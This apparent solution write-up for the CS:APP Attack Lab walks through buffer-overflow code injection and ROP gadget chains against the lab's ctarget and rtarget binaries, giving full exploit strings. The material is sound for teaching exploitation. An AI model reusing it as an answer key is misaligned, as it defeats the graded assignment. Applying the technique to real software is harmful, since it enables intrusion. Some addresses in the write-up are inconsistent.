## ctarget

### phase 1

This one is the easiest out of all of the `ctarget` phases. The goal of the first phase is to overflow the stack with the exploit string and change the return address of `getbuf` to the address of `touch1` function.

First step is to run `gdb ctarget` and set a breakpoint for `getbuf`

`b getbuf`

Then we need to `disas` the function:

```
Dump of assembler code for function getbuf:
=> 0x000000000040256b <+0>:     sub    $0x28,%rsp
   0x000000000040256f <+4>:     mov    %rsp,%rdi
   0x0000000000402572 <+7>:     call   0x40280c <Gets>
   0x0000000000402577 <+12>:    mov    $0x1,%eax
   0x000000000040257c <+17>:    add    $0x28,%rsp
   0x0000000000402580 <+21>:    ret    
End of assembler dump.
```

At the top of the frame, you can see the instruction `sub    $0x28,%rsp`. This is allocating `0x28` or `40` bytes of buffer for the function `getbuf`.

Since the buffer size is now known, we need 40 bytes of padding followed by the return address of touch1.

`objdump -d ctarget > ctarget.d`

When peeking inside of the dump we find the address of `touch1`.

```
0000000000402581 <touch1>:
  402581:	50                   	push   %rax
  402582:	58                   	pop    %rax
  402583:	48 83 ec 08          	sub    $0x8,%rsp
  402587:	c7 05 ab 22 11 00 01 	movl   $0x1,0x1122ab(%rip)        # 51483c <vlevel>
  40258e:	00 00 00 
  402591:	48 8d 3d e4 9c 0d 00 	lea    0xd9ce4(%rip),%rdi        # 4dc27c <_IO_stdin_used+0x27c>
  402598:	e8 73 4e 01 00       	call   417410 <_IO_puts>
  40259d:	bf 01 00 00 00       	mov    $0x1,%edi
  4025a2:	e8 df 04 00 00       	call   402a86 <validate>
  4025a7:	bf 00 00 00 00       	mov    $0x0,%edi
  4025ac:	e8 6f ac 00 00       	call   40d220 <exit>
```

So, the address is at `0x402581`

After creating a text file called `ctarget.l1.txt` we can input our first 40 bytes of buffer, and then the address of `touch1` in reverse because of little endian order.

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
81 25 40 00 00 00 00 00
```

Since these are hex values, we need to run it through the `hex2raw` to generate the raw exploit string, and run the program which is handily combined into one command.


```
cat ctarget.l1.txt | ./hex2raw | ./ctarget
```

The following terminal output should look something like displayed below (cookie will be different)

```
Cookie: 0x2a39efbd
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

---

### phase 2

If we look at the `ctarget.d` file, we can see that to pass this phase, we need to pass our cookie as an argument into the touch2 function.


```
00000000004025b1 <touch2>:
  4025b1:	50                   	push   %rax
  4025b2:	58                   	pop    %rax
  4025b3:	48 83 ec 08          	sub    $0x8,%rsp
  4025b7:	89 fa                	mov    %edi,%edx
  4025b9:	c7 05 79 22 11 00 02 	movl   $0x2,0x112279(%rip)        # 51483c <vlevel>
  4025c0:	00 00 00 
  4025c3:	39 3d 7b 22 11 00    	cmp    %edi,0x11227b(%rip)        # 514844 <cookie>
  4025c9:	74 2a                	je     4025f5 <touch2+0x44>
  4025cb:	48 8d 35 f6 9c 0d 00 	lea    0xd9cf6(%rip),%rsi        # 4dc2c8 <_IO_stdin_used+0x2c8>
  4025d2:	bf 01 00 00 00       	mov    $0x1,%edi
  4025d7:	b8 00 00 00 00       	mov    $0x0,%eax
  4025dc:	e8 ef 44 05 00       	call   456ad0 <___printf_chk>
  4025e1:	bf 02 00 00 00       	mov    $0x2,%edi
  4025e6:	e8 95 05 00 00       	call   402b80 <fail>
  4025eb:	bf 00 00 00 00       	mov    $0x0,%edi
  4025f0:	e8 2b ac 00 00       	call   40d220 <exit>
  4025f5:	48 8d 35 a4 9c 0d 00 	lea    0xd9ca4(%rip),%rsi        # 4dc2a0 <_IO_stdin_used+0x2a0>
  4025fc:	bf 01 00 00 00       	mov    $0x1,%edi
  402601:	b8 00 00 00 00       	mov    $0x0,%eax
  402606:	e8 c5 44 05 00       	call   456ad0 <___printf_chk>
  40260b:	bf 02 00 00 00       	mov    $0x2,%edi
  402610:	e8 71 04 00 00       	call   402a86 <validate>
  402615:	eb d4                	jmp    4025eb <touch2+0x3a>
```

Since the register `%rdi` stores the first argument, we need to write some assembly code to move our cookie address.

```
movq $0x2a39efbd, %rdi
retq
```

This should be saved in a file called `ctarget.l2.s`. This can then be compiled and disassembed to get the memory address of our cookie.


```
gcc -c ctarget.l2.s
objdump -d ctarget.l2.o > ctarget.l2.d
```

Now if we open `ctarget.12.d` we find:

```

ctarget.l2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 bd ef 39 2a 	mov    $0x2a39efbd,%rdi
   7:	c3                   	ret    
```

We want the byte representation of the code which is `48 c7 c7 bd ef 39 2a c3`.

Now we need to find the value of the `%rsp` register.

Run `gdb ctarget`.

Set a breakpoint at getbuf `b getbuf`

Run `ctarget` using `r`

Now disassemble `disas`.

```
Dump of assembler code for function getbuf:
=> 0x000000000040256b <+0>:     sub    $0x28,%rsp
   0x000000000040256f <+4>:     mov    %rsp,%rdi
   0x0000000000402572 <+7>:     call   0x40280c <Gets>
   0x0000000000402577 <+12>:    mov    $0x1,%eax
   0x000000000040257c <+17>:    add    $0x28,%rsp
   0x0000000000402580 <+21>:    ret    
End of assembler dump.
```

We want the instruction right before `add    $0x28,%rsp`, so let's set a breakpoint and run until just before that instruction.

`until *0x0000000000402577`


This will call the function to input a string, which you can then use to check what `%rsp` returns.

```
(gdb) x/s $rsp
0x5565c750:     "jfieowafjaidofjasdiofndasifeawjvewiojviwaeojvaw" /* the string I typed */
```

The address `0x5565c750` is what we want so we can inject our cookie into that memory address.

Now create a file calledd `ctarget.l2.txt` and put your cookie, padding of 40 bytes, address of `%rsp`, and address of `touch2` function in that order but order the bytes in reverse.

```
48 c7 c7 bd ef 39 2a c3 /* cookie */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* padding */
00 00 00 00 00 00 00 00
50 c7 65 55 00 00 00 00 /* address of %rsp */
b1 25 40 00 00 00 00 00 /* touch2 funciton location */
```

Run it
```
cat ctarget.l2.txt | ./hex2raw | ./ctarget
```

The following output should yield

```
Cookie: 0x2a39efbd
Type string:Touch2!: You called touch2(0x2a39efbd)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

---

### phase 3

This level is similar to that of the previous one, but instead of passing in the hex value of our cookie, we need to pass in the string version. To do so, we need to convert our hex number `0x2a39efbd` into an ASCII equivalent for each of the numbers without the preceeding `0x` which looks like:

```
32 61 33 39 65 66 62 64
```

The next step is to set the register %rdi to this address. The included manual to this lab states that we have to be careful with the function `hexmatch` and `strncmp`, so we have to be careful with where we store it.

If we store it after touch3, we can avoid this problem because `hexmatch` is called in the function touch3.

Since the functions `hexmatch` and `strncmp` overwite part of the stack, we need to adjust the total amount of bytes right before the cookie.

It will look something like `buffer (40 bytes) + 8 bytes for the return address of rsp + 8 bytes for touch3`.

`0x28 + 8 + 8 = 40 + 16 = 0x38 56`

We already have the address for `%rsp` from phase 2: `0x5565c750`, and we just need to add 
`0x38` to it. `0x5565c750 + 0x38 = 0x5565c788`

Now we can generate some assembly code to find the address where the cookie is present

```
movq $0x5565c788, %rdi /* %rsp + 0x38 */
retq
```

This gives us in byte representation:

```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 88 c7 65 55 	mov    $0x5565c788,%rdi
   7:	c3                   	ret    
```

Now that we have all the components, all together it will look like:

```
48 c7 c7 88 c7 65 55 c3 /* rsp + 0x38 the address where the cookie is present */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
50 c7 65 55 00 00 00 00 /* return address $rsp */
c6 26 40 00 00 00 00 00 /* touch3 address */
32 61 33 39 65 66 62 64 /* cookie string */
```


To run it we simply use

```
cat ctarget.l3.txt | ./hex2raw | ./ctarget
```

The expected output

```
Cookie: 0x2a39efbd
Type string:Touch3!: You called touch3("2a39efbd")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

---

## rtarget

### phase 4

This phase is essentially the same as phase 2, but instead of injecting code into the target destination, we are trying to create a gadget to try and inject our code into the `rtarget` program.

To do this, we need a gadget that will pop the the `%rdi` register off the stack. In the instruction manual, it is given that `popq %rdi` is `5f`, which is not found in `rtarget.d` after `objdump -d rtarget > rtarget.d`. So, instead, we will use `popq %rax` as a substitute.

After scanning my dump file, we find:

```
00000000004027b9 <addval_349>:
  4027b9:	f3 0f 1e fa          	endbr64 
  4027bd:	8d 87 c9 58 90 c3    	lea    -0x3c6fa737(%rdi),%eax
  4027c3:	c3                   	ret    
```

`90` will just increment the program counter by 1. `c3` will return.

The next instruction we need is `movq %rax, %rdi` which is specified as: `48 89 c7`.

This can be found in the dump here:

```
00000000004027af <getval_474>:
  4027af:	f3 0f 1e fa          	endbr64 
  4027b3:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  4027b8:	c3                   	ret   
```

Now we have two gadgets and can exploit the rtarget program.

The exploit we are doing is:

```
popq %rax
movq %rax, %rdi
ret
```

We have all the components, so the next step is to put them all together.

First we need the buffer size (0x28). After formatting that, we need the address of gadget 1.

To find the address of gadget 1, we take `4027bd`, and then add 3 to it because that is where the `58` is located.

```
4027c0
```

To find the address of the second gadget `4027b3`, we do the same thing, but add 1.

```
4027b4
```

Now, we can assemble all of this into a `.txt` file:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 27 40 00 00 00 00 00 /* address of gadget 1 */
bd ef 39 2a 00 00 00 00 /* hex cookie */
b4 27 40 00 00 00 00 00 /* address of gadget 2 */
b1 25 40 00 00 00 00 00 /* address of touch2 */
```

Run using

```
cat rtarget.l2.txt | ./hex2raw | ./rtarget
```

Expected output
```
Cookie: 0x2a39efbd
Type string:Touch2!: You called touch2(0x2a39efbd)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

---

### phase 5

For this final phase, we need to invoke `touch3` with a pointer to a string representation of our cookie (just like in phase 3 for `ctarget`). But, just like phase 4, we will have to use gadgets to accomplish this instead of just code injections.

it will go:

```
buffer (40 bytes)
movq %rsp, %rdi
popq %rax
offset (to have room for the touch 3 address)
movq %rax, %rsi
add_xy
movq %rax %rdi
touch3
cookie string
```

since this phase is unecessarily lengthy, I will break it down into steps.

#### step1

For this step, you want to be careful of where `48 89 e0` is placed. Specifically, you want it to be placed right next to the `c3` so that it returns.

`48 89 e0 c3 movq %rsp to %rax`

```
0000000000402898 <addval_372>:
  402898:	f3 0f 1e fa          	endbr64 
  40289c:	8d 87 4c 48 89 e0    	lea    -0x1f76b7b4(%rdi),%eax
  4028a2:	c3                   	ret
```

`40289c + 3 = 40289f`


#### step2

same as step1, you want the `c3` to be at the end of `48 89 c7`.

`48 89 c7 c3 movq %rax to %rdi`

```
000000000040276d <addval_175>:
  40276d:	f3 0f 1e fa          	endbr64 
  402771:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  402777:	c3                   	ret   
```

`402771 + 2 = 402773`


#### step3

`58 c3 popq %rax`

the `90` in between `58` and `c3` shouldn't be a problem because it is a `nop`.

```
00000000004027b9 <addval_349>:
  4027b9:	f3 0f 1e fa          	endbr64 
  4027bd:	8d 87 c9 58 90 c3    	lea    -0x3c6fa737(%rdi),%eax
  4027c3:	c3                   	ret
```

`4027bd + 3 = 4027c0`


#### step4

why the offset? the offset is important because we need to have enough space for the empty row to the touch3 address. for now, let's fill in the row with just 0s

`00 00 00 00 00 00 00 00`. we'll modify at the last step.


#### step5


in these next few steps, there will be weird things like `08 db` and `08 d2` in between the instruction and the return value `c3`. the ones that are on the pdf chart that indicate 2-byte nop instrucitons are the ones you want to use.

when doing `movl`, the upper 4 bytes are ignored, and only the lower 32 bits are used.

`movq %rax, %rsi`. since this instruction needs to be broken up, my gadget farm indicated I needed to go

`%eax to %ecx`, then `%ecx to %edx`, finally `%edx, %esi`.


`89 c1 movl %eax, %ecx`

```
00000000004028f8 <addval_473>:
  4028f8:	f3 0f 1e fa          	endbr64 
  4028fc:	8d 87 89 c1 08 db    	lea    -0x24f73e77(%rdi),%eax
  402902:	c3                   	ret
```

`4028fc + 2 = 4028fe`


#### step6

`89 ca movl %ecx, %edx`

```
0000000000402858 <getval_431>:
  402858:	f3 0f 1e fa          	endbr64 
  40285c:	b8 89 ca 20 db       	mov    $0xdb20ca89,%eax
  402861:	c3                   	ret
```

`40285c + 1 = 40285d`


#### step7

`89 d6 movl %edx, %esi`

```
0000000000402903 <addval_446>:
  402903:	f3 0f 1e fa          	endbr64 
  402907:	8d 87 89 d6 08 d2    	lea    -0x2df72977(%rdi),%eax
  40290d:	c3                   	ret
```

`402907 + 2 = 402909`


you will notice in each of these steps there are weird encodings like `20 db` or `08 d2` in between the `movl "" ""` instruction code and `c3`. these are the 2-byte nop encodings, and just like how `90` functions as a nop code, these will have no effect on your memory addresses.

#### step8

for this step, all we need to do is locate the address of the `add_xy` function. literally the only simple part to this whole phase, ha.

`lea (%rdi, %rsi, 1), %rax (add_xy)`

```
00000000004027ce <add_xy>:
  4027ce:	f3 0f 1e fa          	endbr64 
  4027d2:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4027d6:	c3                   	ret
```

`4027ce`


#### step9

`48 89 c7 c3 movq %rax, %rdi` (same as step 2)

```
00000000004027af <getval_474>:
  4027af:	f3 0f 1e fa          	endbr64 
  4027b3:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  4027b8:	c3                   	ret    
```

`4027b3 + 1 = 4027b4`


#### step10

touch3 address (from phase3)

`c6 26 40 00 00 00 00 00`


#### step11

cookie string (from phase3)

`32 61 33 39 65 66 62 64`


### remember that offset? yeah let's do that now

so, for the offset, since we have now assembled all of the instructions together, we can count how many steps there are including the offset. I have 6 lines of 8 bytes which means that I'll need an offset of 48 written like `48 00 00 00 00 00 00 00`.


#### the txt document

phew, that was a lot of steps. if you've followed along so far, this is what your .txt file should look like

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* buffer */
9f 28 40 00 00 00 00 00 /* step1: movq %rsp, %rax */
b4 27 40 00 00 00 00 00 /* step2: movq %rax, %rdi */
c0 27 40 00 00 00 00 00 /* step3: popq %rax */
48 00 00 00 00 00 00 00 /* step4: offset */
fe 28 40 00 00 00 00 00 /* step5: movl %eax, %ecx */
5d 28 40 00 00 00 00 00 /* step6: movl %ecx, %edx */
09 29 40 00 00 00 00 00 /* step7: movl %edx, %esi */
d2 27 40 00 00 00 00 00 /* step8: lea (%rdi,%rsi,1), %eax (add_xy) */
b4 27 40 00 00 00 00 00 /* step2: movq %rax, %rdi */
c6 26 40 00 00 00 00 00 /* step10: touch3 address (from phase3) */
32 61 33 39 65 66 62 64 /* step11: cookie string */
```


finally, this can all be run using

`cat rtarget.l3.txt | ./hex2raw | ./rtarget`


the final output should look something like

```
Cookie: 0x2a39efbd
Type string:Touch3!: You called touch3("2a39efbd")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```